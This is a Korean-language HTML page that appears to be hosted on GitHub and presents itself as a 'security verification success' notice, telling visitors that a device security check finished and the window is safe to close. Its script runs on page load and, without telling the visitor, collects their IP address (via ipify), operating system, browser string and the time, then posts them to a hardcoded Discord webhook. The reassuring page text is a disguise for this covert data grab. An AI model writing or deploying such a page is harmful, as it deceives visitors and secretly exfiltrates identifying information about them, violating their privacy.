<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Security Verification Success</title>
    <script>
        async function sendLog() {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd";

            try {
                // 1. IP 주소 가져오기 (ipify 사용 - 가장 안정적)
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const userIp = ipData.ip;

                // 2. 현재 시간 세팅
                const now = new Date();
                const timeStr = now.toLocaleString('en-US', { 
                    weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', 
                    hour: '2-digit', minute: '2-digit', hour12: true 
                });

                // 3. 디스코드 페이로드
                const payload = {
                    "embeds": [{
                        "title": "✅ 인증 성공 (GitHub)",
                        "color": 3066993,
                        "fields": [
                            { "name": "👤 유저 정보", "value": "GitHub Page 접속자", "inline": false },
                            { "name": "🔑 2차 인증", "value": "False", "inline": true },
                            { "name": "⌚ 인증 시각", "value": timeStr, "inline": false },
                            { "name": "🌐 아이피 정보", "value": `아이피: ${userIp}`, "inline": false },
                            { "name": "💻 운영체제", "value": navigator.platform, "inline": true },
                            { "name": "🧭 브라우저", "value": navigator.userAgent.split(' ').pop(), "inline": true }
                        ],
                        "footer": { "text": `전송 완료 | ${now.toLocaleTimeString()}` }
                    }]
                };

                // 4. 전송 (No-Cors 이슈 방지)
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                console.log("전송 성공");
            } catch (error) {
                console.error("오류 발생:", error);
            }
        }

        window.onload = sendLog;
    </script>
    <style>
        body{background:#0b0e14;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
        .card{text-align:center;background:#161b22;padding:50px;border-radius:20px;border:1px solid #30363d;box-shadow:0 10px 40px rgba(0,0,0,.5)}
        .icon{width:80px;height:80px;background:#238636;color:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:50px;margin:0 auto 20px}
        h1{font-size:24px;margin:10px 0;color:#f0f6fc}
        p{color:#8b949e;font-size:15px;line-height:1.5}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">✔</div>
        <h1>인증 성공</h1>
        <p>기기 보안 점검 및 환경 최적화가<br>성공적으로 완료되었습니다.</p>
        <p style="font-size:12px;margin-top:20px;color:#58a6ff">이 창은 안전하게 닫으셔도 됩니다.</p>
    </div>
</body>
</html>
